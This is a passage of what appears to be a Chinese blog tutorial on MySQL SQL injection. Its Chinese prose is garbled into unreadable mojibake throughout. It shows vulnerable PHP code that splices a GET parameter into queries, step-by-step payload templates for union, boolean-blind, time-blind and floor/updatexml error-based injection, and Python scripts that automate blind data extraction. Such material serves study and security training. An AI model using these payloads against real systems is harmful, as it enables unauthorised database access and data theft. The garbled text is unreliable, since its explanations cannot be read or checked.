<p>ä¸­é—´ä»¶é€šè¿‡GETä¼ å…¥ç”¨æˆ·æŒ‡å®šçš„<code>id</code>å‚æ•°ï¼Œå¹¶èµ‹å€¼ç»™<code>$id</code>å˜é‡ï¼Œ<code>$id</code>åœ¨åé¢æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­ï¼Œç„¶ååœ¨æ•°æ®åº“ä¸­æ‰§è¡Œäº†æ­¤SQLè¯­å¥ã€‚</p>
<h2 id="æ³¨å…¥ç±»å‹"><a href="#æ³¨å…¥ç±»å‹" class="headerlink" title="æ³¨å…¥ç±»å‹"></a>æ³¨å…¥ç±»å‹</h2><p>SQLæ³¨å…¥æŒ‰æ•°æ®ç±»å‹åˆ†ä¸ºæ•°å­—å‹æ³¨å…¥å’Œå­—ç¬¦å‹æ³¨å…¥</p>
<h3 id="æ•°å­—å‹æ³¨å…¥"><a href="#æ•°å­—å‹æ³¨å…¥" class="headerlink" title="æ•°å­—å‹æ³¨å…¥"></a>æ•°å­—å‹æ³¨å…¥</h3><p>æ•°å­—å‹æ³¨å…¥å°±æ˜¯æ³¨å…¥ç‚¹çš„æ•°æ®ç±»å‹ä¸ºæ•°å­—å‹ï¼Œ<strong>æ²¡æœ‰</strong>ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬èµ·æ¥ã€‚</p>
<p>å…¸å‹ä»£ç ç¤ºä¾‹</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">...</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span></code></pre>

<p>åˆ¤æ–­æ–¹æ³•ï¼š</p>
<ol>
<li>è¾“å…¥å•å¼•å·æ—¶ï¼Œä¸æ­£å¸¸è¿”å›</li>
</ol>
<p>ç”¨æˆ·æäº¤<code>index.php?id=1&#39;</code>æ—¶ï¼Œå•ä¸ªçš„å•å¼•å·æ²¡æœ‰é—­åˆï¼Œäº§ç”Ÿäº†è¯­æ³•é”™è¯¯ï¼Œä¸æ­£å¸¸è¿”å›ã€‚</p>
<ol start="2">
<li>è¾“å…¥ <code>and 1=1</code>ï¼Œæ­£å¸¸è¿”å›</li>
</ol>
<p>ç”¨æˆ·æäº¤<code>index.php?id=1 and 1=1</code>æ—¶ï¼Œè¯­å¥æ‹¼æ¥åæŸ¥è¯¢æˆåŠŸï¼Œæ­£å¸¸è¿”å›ã€‚</p>
<ol start="3">
<li>è¾“å…¥ <code>and 1=2</code>ï¼Œä¸æ­£å¸¸è¿”å›</li>
</ol>
<p>ç”¨æˆ·æäº¤<code>index.php?id=1 and 1=2</code>æ—¶ï¼Œ<code>1=2</code>ä¸º<code>false</code>ï¼ŒæŸ¥è¯¢å¤±è´¥ï¼Œä¸æ­£å¸¸è¿”å›ã€‚</p>
<h3 id="å­—ç¬¦å‹æ³¨å…¥"><a href="#å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥"></a>å­—ç¬¦å‹æ³¨å…¥</h3><p>å­—ç¬¦å‹æ³¨å…¥å°±æ˜¯æ³¨å…¥ç‚¹çš„æ•°æ®ç±»å‹ä¸ºå­—ç¬¦å‹ï¼Œ<strong>æœ‰ç”¨</strong>å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬èµ·æ¥ã€‚</p>
<p>å…¸å‹ä»£ç ç¤ºä¾‹</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">...</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = '<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span></code></pre>

<p>åˆ¤æ–­æ–¹æ³•</p>
<ol>
<li>è¾“å…¥å•å¼•å·ï¼Œä¸æ­£å¸¸è¿”å›</li>
</ol>
<p>ç”¨æˆ·æäº¤<code>index.php?id=1&#39;</code>æ—¶ï¼Œæ‹¼æ¥çš„SQLè¯­å¥å˜æˆäº†<code>SELECT * FROM users WHERE id = &#39;1&#39;&#39; LIMIT 0,1</code>å•å¼•å·æ²¡æœ‰é—­åˆï¼Œäº§ç”Ÿäº†è¯­æ³•é”™è¯¯ï¼Œä¸æ­£å¸¸è¿”å›ã€‚</p>
<ol start="2">
<li>è¾“å…¥ <code>&#39;and &#39;1&#39;=&#39;1</code>ï¼Œæ­£å¸¸è¿”å›</li>
</ol>
<p>ç”¨æˆ·æäº¤<code>&#39;and &#39;1&#39;=&#39;1</code>æ—¶ï¼Œæ‹¼æ¥çš„SQLè¯­å¥å˜æˆäº†<code>SELECT * FROM users WHERE id = &#39;1&#39; and &#39;1&#39;=&#39;1&#39; LIMIT 0,1</code>ï¼ŒæŸ¥è¯¢æˆåŠŸï¼Œæ­£å¸¸è¿”å›ã€‚</p>
<ol start="3">
<li>è¾“å…¥ <code>&#39;and &#39;1&#39;=&#39;2</code>ï¼Œä¸æ­£å¸¸è¿”å›</li>
</ol>
<p>ç”¨æˆ·æäº¤<code>&#39;and &#39;1&#39;=&#39;2</code>æ—¶ï¼Œæ‹¼æ¥çš„SQLè¯­å¥å˜æˆäº†<code>SELECT * FROM users WHERE id = &#39;1&#39; and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code>ï¼Œ<code>&#39;1&#39;=&#39;2&#39;</code>ä¸º<code>false</code>ï¼ŒæŸ¥è¯¢å¤±è´¥ï¼Œä¸æ­£å¸¸è¿”å›ã€‚</p>
<h1 id="MySQLæ³¨å…¥"><a href="#MySQLæ³¨å…¥" class="headerlink" title="MySQLæ³¨å…¥"></a>MySQLæ³¨å…¥</h1><p>MySQLæ•°æ®åº“æ˜¯ä¸€ç§å¼€æºçš„å…³ç³»å‹æ•°æ®åº“æŸ¥è¯¢ç³»ç»Ÿï¼Œæ˜¯ä½¿ç”¨é‡æœ€é«˜çš„ä¸€ç§æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œè¿™é‡Œå°†ä»¥MySQLä¸ºä¾‹å­è®²è§£å¸¸è§çš„å‡ ç§æ³¨å…¥æ–¹å¼ã€‚</p>
<h2 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h2><p>åˆ©ç”¨MySQLä¸­<code>UNION</code>å…³é”®è¯å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡SQLè¯­å¥çš„ç‰¹ç‚¹ï¼Œåœ¨å‚æ•°ä¸­æ’å…¥æ¶æ„çš„SQLæ³¨å…¥è¯­å¥ï¼Œæ‰§è¡Œé¢å¤–çš„SQLè¯­å¥ï¼Œè·å–é¢å¤–æ•æ„Ÿä¿¡æ¯æˆ–è€…æ‰§è¡Œå…¶ä»–æ•°æ®åº“æ“ä½œã€‚</p>
<h3 id="payloadæ¨¡æ¿ä¸æ­¥éª¤"><a href="#payloadæ¨¡æ¿ä¸æ­¥éª¤" class="headerlink" title="payloadæ¨¡æ¿ä¸æ­¥éª¤"></a>payloadæ¨¡æ¿ä¸æ­¥éª¤</h3><ol>
<li>åˆ¤æ–­æ³¨å…¥ç‚¹</li>
</ol>
<pre class="language-php" data-language="php"><code class="language-php">id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span></code></pre>

<ol start="2">
<li>åˆ¤æ–­åˆ—æ•°</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 order by 1</code></pre>

<ol start="3">
<li>åˆ¤æ–­æŠ¥é”™ç‚¹</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and 1&#x3D;2 union select 1,2,3</code></pre>

<ol start="4">
<li>æŸ¥å½“å‰åº“å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and 1&#x3D;2 union select database()</code></pre>
<pre class="language-none"><code class="language-none">id&#x3D;1 and 1&#x3D;2 union select CONCAT_WS(CHAR(32,58,32),user(),database(),version())</code></pre>

<ol start="5">
<li>æŸ¥è¡¨å</li>
</ol>
<pre class="language-php" data-language="php"><code class="language-php">id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> union select <span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema<span class="token operator">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span></code></pre>

<ol start="6">
<li>æŸ¥åˆ—å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and 1&#x3D;2 union select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;è¡¨å&#39; limit 0,1</code></pre>

<ol start="7">
<li>æŸ¥å­—æ®µ</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and 1&#x3D;2 union select group_concat(åˆ—åï¼Œåˆ—åÂ·Â·Â·) from åº“å limit 0,1</code></pre>

<h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ol>
<li>unionç”¨äºåˆå¹¶å¤šä¸ªselectè¯­å¥çš„ç»“æœï¼Œå¹¶é»˜è®¤å»é‡</li>
</ol>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png" class="" title="image-20210724161433506" loading="lazy">

<ol start="2">
<li>è”åˆæŸ¥è¯¢ä¸­åˆå¹¶çš„é€‰æ‹©æŸ¥è¯¢å¿…é¡»å…·ç›¸åŒçš„è¾“å‡ºå­—æ®µæ•°ï¼Œé‡‡ç”¨ç›¸åŒçš„é¡ºåºï¼Œå¹¶åŒ…å«ç›¸åŒæˆ–å…¼å®¹çš„æ•°æ®ç±»å‹</li>
</ol>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724160925428.png" class="" title="image-20210724160925428" loading="lazy">

<h2 id="boolç›²æ³¨"><a href="#boolç›²æ³¨" class="headerlink" title="boolç›²æ³¨"></a>boolç›²æ³¨</h2><p>ä¸æŠ¥é”™æ³¨å…¥ä¸åŒï¼Œboolç›²æ³¨æ²¡æœ‰ä»»ä½•çš„æŠ¥é”™ä¿¡æ¯è¾“å‡ºï¼Œé¡µé¢åªæœ‰æ­£å¸¸å’Œä¸æ­£å¸¸ä¸¤ç§çŠ¶æ€ï¼Œæ”»å‡»è€…åªèƒ½é€šè¿‡è¿”å›çš„ä¸¤ä¸ªçŠ¶æ€æ¥åˆ¤æ–­è¾“å…¥çš„SQLè¯­å¥æ˜¯å¦æ­£ç¡®ï¼Œä»è€Œåˆ¤æ–­æ•°æ®åº“ä¸­å‚¨å­˜äº†å“ªäº›ä¿¡æ¯ã€‚</p>
<h3 id="payloadæ¨¡æ¿ä¸æ­¥éª¤-1"><a href="#payloadæ¨¡æ¿ä¸æ­¥éª¤-1" class="headerlink" title="payloadæ¨¡æ¿ä¸æ­¥éª¤"></a>payloadæ¨¡æ¿ä¸æ­¥éª¤</h3><ol>
<li>è·å–æ•°æ®åº“é•¿åº¦</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select length(database()))&gt;10</code></pre>

<ol start="2">
<li>æŸ¥åº“å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select ascii(substr(database(),1,1)))&gt;63</code></pre>

<ol start="3">
<li>æŸ¥è¡¨å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;63</code></pre>

<ol start="4">
<li>æŸ¥åˆ—å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;è¡¨å&#39;),1,1))&gt;63</code></pre>

<ol start="5">
<li>æŸ¥å­—æ®µ</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and ascii(substr((select åˆ—å from è¡¨å),1,1))&gt;63</code></pre>

<h3 id="æ³¨æ„äº‹é¡¹-1"><a href="#æ³¨æ„äº‹é¡¹-1" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ol>
<li>substrå‡½æ•°</li>
</ol>
<p>è¯­æ³•æ ¼å¼ï¼šSUBSTR(å­—æ®µå,A,N)</p>
<p>ä»æŒ‡å®šçš„å­—æ®µä»ç¬¬Aä¸ªå­—ç¬¦ï¼ˆè¿™é‡Œçš„å­—ç¬¦ä»<strong>1</strong>å¼€å§‹ï¼‰å‘åæˆªå–Nä¸ªå­—ç¬¦</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724183800027.png" class="" title="image-20210724183800027" loading="lazy">

<ol start="2">
<li>asciiå‡½æ•°</li>
</ol>
<p>è¯­æ³•æ ¼å¼ï¼šASCII(å­—ç¬¦)</p>
<p>è¿”å›å­—ç¬¦çš„ASCIIç </p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184056134.png" class="" title="image-20210724184056134" loading="lazy">

<ol start="3">
<li>è„šæœ¬</li>
</ol>
<p>ç›²æ³¨éƒ½æ˜¯æ­é…è„šæœ¬ä½¿ç”¨çš„ï¼Œè¿™é‡Œæä¾›ä¸€ä¸ªç®€å•çš„pythonè„šæœ¬æ¨¡æ¿ï¼Œæ ¹æ®å…·ä½“ç¯å¢ƒä¿®æ”¹</p>
<ul>
<li>éå†æŸ¥è¯¢</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php">import requests

url <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>      <span class="token comment">#éœ€è¦ç›²æ³¨çš„ç½‘å€</span>

payload <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>   <span class="token comment">#boolç›²æ³¨çš„payload</span>

flagstr <span class="token operator">=</span> <span class="token string single-quoted-string">'0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm-&#125;&#123;'</span>  

flag <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>

<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> c in flagstr<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string double-quoted-string">"id"</span><span class="token punctuation">:</span>payload<span class="token operator">.</span><span class="token function">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>c<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string single-quoted-string">''</span> in r<span class="token operator">.</span>text<span class="token punctuation">:</span>    <span class="token comment">#è¿”å›çš„é¡µé¢æˆåŠŸæ—¶çš„å›æ˜¾ï¼Œç”±æ­¤åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ­¤å­—ç¬¦</span>
            flag<span class="token operator">+=</span>c
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">if</span> c<span class="token operator">==</span><span class="token string single-quoted-string">'&#125;'</span><span class="token punctuation">:</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<ul>
<li>äºŒåˆ†æŸ¥è¯¢</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php">import requests

url <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>

flag <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>

payload <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>

<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token class-name return-type">max</span><span class="token operator">=</span><span class="token number">128</span>
    min<span class="token operator">=</span><span class="token number">32</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        mid<span class="token operator">=</span><span class="token punctuation">(</span>max<span class="token operator">+</span>min<span class="token punctuation">)</span><span class="token comment">//2</span>
        <span class="token keyword">if</span> min<span class="token operator">==</span>mid<span class="token punctuation">:</span>
            flag<span class="token operator">+=</span><span class="token function">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token operator">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token function">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">:</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> 
        <span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string single-quoted-string">''</span> in r<span class="token operator">.</span>text<span class="token punctuation">:</span>    <span class="token comment">#è¿”å›çš„é¡µé¢æˆåŠŸæ—¶çš„å›æ˜¾ï¼Œç”±æ­¤åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ­¤å­—ç¬¦</span>
            min<span class="token operator">=</span>mid
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            max<span class="token operator">=</span>mid</code></pre>

<h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>æ—¶é—´ç›²æ³¨æ˜¯å¦ä¸€ç§å½¢å¼çš„ç›²æ³¨ï¼Œä¸boolç›²æ³¨ä¸åŒï¼Œæ—¶é—´ç›²æ³¨æ²¡æœ‰ä»»ä½•çš„æŠ¥é”™ä¿¡æ¯è¾“å‡ºï¼Œé¡µé¢ä¸ç®¡å¯¹æˆ–é”™éƒ½æ˜¯ä¸€ç§çŠ¶æ€ï¼Œæ”»å‡»è€…æ— æ³•é€šè¿‡é¡µé¢è¿”å›çŠ¶æ€æ¥åˆ¤æ–­è¾“å…¥çš„SQLæ³¨å…¥æµ‹è¯•è¯­å¥æ˜¯å¦æ­£ç¡®ï¼Œåªèƒ½é€šè¿‡æ„é€ çš„SQLæµ‹è¯•è¯­å¥ï¼Œæ ¹æ®é¡µé¢çš„è¿”å›æ—¶é—´åˆ¤æ–­æ•°æ®åº“ä¸­å‚¨å­˜äº†å“ªäº›ä¿¡æ¯ã€‚</p>
<h3 id="payloadæ¨¡æ¿ä¸æ­¥éª¤-2"><a href="#payloadæ¨¡æ¿ä¸æ­¥éª¤-2" class="headerlink" title="payloadæ¨¡æ¿ä¸æ­¥éª¤"></a>payloadæ¨¡æ¿ä¸æ­¥éª¤</h3><ol>
<li>è·å–æ•°æ®åº“é•¿åº¦</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and sleep(if(length((select database())&#x3D;5),0,5))</code></pre>

<ol start="2">
<li>æŸ¥åº“å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and sleep(if((select ascii(substr(database(),1,1)))&gt;63,0,5))</code></pre>

<ol start="3">
<li>æŸ¥è¡¨å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;63,0,5))</code></pre>

<ol start="4">
<li>æŸ¥åˆ—å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and sleep(if(ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;è¡¨å&#39;),1,1))&gt;63,0,5))</code></pre>

<ol start="5">
<li>æŸ¥å­—æ®µ</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and sleep(if(ascii(substr((select åˆ—å from è¡¨å),1,1))&gt;63,0,5))</code></pre>

<h3 id="æ³¨æ„äº‹é¡¹-2"><a href="#æ³¨æ„äº‹é¡¹-2" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ol>
<li>sleepå‡½æ•°</li>
</ol>
<p>è¯­æ³•æ ¼å¼ï¼šSLEEP(æ—¶é—´)</p>
<p>ä½¿æ‰§è¡ŒæŒ‚èµ·ä¸€æ®µæ—¶é—´ï¼Œå•ä½ä¸ºç§’</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184131894.png" class="" title="image-20210724184131894" loading="lazy">

<ol start="2">
<li>ifå‡½æ•°</li>
</ol>
<p>è¯­æ³•æ ¼å¼ï¼šIF(expr1,expr2,expr3)</p>
<p>æ•ˆæœç±»ä¼¼äºç¼–ç¨‹è¯­è¨€ä¸­å¸¸è§çš„ä¸‰å…ƒè¿ç®—ç¬¦ï¼Œå¦‚æœexpr1ä¸ºçœŸï¼ˆä¸ç­‰äº0ä¸”ä¸ç­‰äºnullï¼‰ï¼Œè¿”å›expr2ï¼Œå¦åˆ™è¿”å›expr3</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184513617.png" class="" title="image-20210724184513617" loading="lazy">

<ol start="3">
<li>è„šæœ¬</li>
</ol>
<pre class="language-php" data-language="php"><code class="language-php">import requests

url <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>

flag <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>

payload <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>

<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token class-name return-type">min</span><span class="token operator">=</span><span class="token number">32</span>
    max<span class="token operator">=</span><span class="token number">128</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        mid<span class="token operator">=</span><span class="token punctuation">(</span>max<span class="token operator">+</span>min<span class="token punctuation">)</span><span class="token comment">//2</span>
        <span class="token keyword">if</span> min<span class="token operator">==</span>mid<span class="token punctuation">:</span>
            flag<span class="token operator">+=</span><span class="token function">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token function">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">:</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            max<span class="token operator">=</span>mid
        except Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            min<span class="token operator">=</span>mid</code></pre>

<h2 id="æŠ¥é”™æ³¨å…¥-floor"><a href="#æŠ¥é”™æ³¨å…¥-floor" class="headerlink" title="æŠ¥é”™æ³¨å…¥-floor"></a>æŠ¥é”™æ³¨å…¥-floor</h2><p>flooræ³¨å…¥æ˜¯æŠ¥é”™æ³¨å…¥çš„ä¸€ç§æ–¹å¼ï¼Œä¸»è¦åŸå› æ˜¯randå‡½æ•°ä¸group byå­å¥ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œrandå‡½æ•°ä¼šè®¡ç®—å¤šæ¬¡ï¼Œä¼šå¯¼è‡´æŠ¥é”™äº§ç”Ÿçš„æ³¨å…¥ã€‚</p>
<h3 id="payloadæ¨¡æ¿ä¸æ­¥éª¤-3"><a href="#payloadæ¨¡æ¿ä¸æ­¥éª¤-3" class="headerlink" title="payloadæ¨¡æ¿ä¸æ­¥éª¤"></a>payloadæ¨¡æ¿ä¸æ­¥éª¤</h3><ol>
<li>æŸ¥åº“å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221449012.png" class="" title="image-20210724221449012" loading="lazy">

<ol start="2">
<li>æŸ¥è¡¨å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select 1 from (select count(*),concat((select (table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2)) x from information_schema.tables group by x)a)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221612834.png" class="" title="image-20210724221612834" loading="lazy">

<ol start="3">
<li>æŸ¥åˆ—å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;è¡¨å&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724224135261.png" class="" title="image-20210724224135261" loading="lazy">

<ol start="4">
<li>æŸ¥å­—æ®µ</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select 1 from (select count(*),concat((select åˆ—å from è¡¨å limit 0,1),0x3a,floor(rand()*2))x from information_schema.tables group by x)a)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724230714048.png" class="" title="image-20210724230714048" loading="lazy">

<h3 id="æ³¨æ„äº‹é¡¹-3"><a href="#æ³¨æ„äº‹é¡¹-3" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ol>
<li>floorå‡½æ•°</li>
</ol>
<p>è¯­æ³•æ ¼å¼ï¼šFLOOR(x)</p>
<p>è¿”å›ä¸å¤§äºxçš„æœ€å¤§æ•´æ•°å€¼</p>
<ol start="2">
<li>randå‡½æ•°</li>
</ol>
<p>è¯­æ³•æ ¼å¼ï¼šRAND()</p>
<p>äº§ç”Ÿä¸€ä¸ªåœ¨0å’Œ1ä¹‹é—´çš„éšæœºæ•°</p>
<p>å½“æä¾›ä¸€ä¸ªç§å­æ•°æ—¶ï¼Œç”Ÿæˆçš„éšæœºæ•°æ˜¯ç›¸åŒçš„</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724232103948.png" class="" title="image-20210724232103948" loading="lazy">

<h2 id="æŠ¥é”™æ³¨å…¥-updatexml"><a href="#æŠ¥é”™æ³¨å…¥-updatexml" class="headerlink" title="æŠ¥é”™æ³¨å…¥-updatexml"></a>æŠ¥é”™æ³¨å…¥-updatexml</h2><p><code>updatexml</code>ä¹Ÿæ˜¯ä¸€ç§æŠ¥é”™æ³¨å…¥ï¼Œå®ƒåˆ©ç”¨<code>updatexml</code>å‡½æ•°ä¸­ç¬¬äºŒä¸ªå‚æ•°<code>XPATH_string</code>çš„æŠ¥é”™è¿›è¡Œæ³¨å…¥ã€‚</p>
<p><code>XPATH_string</code>æ˜¯XMLæ–‡æ¡£è·¯å¾„ï¼Œæ ¼å¼æ˜¯&#x2F;XXX&#x2F;XXX&#x2F;XXX&#x2F;ï¼Œå¦‚æœæ ¼å¼ä¸æ­£ç¡®å°±ä¼šæŠ¥é”™</p>
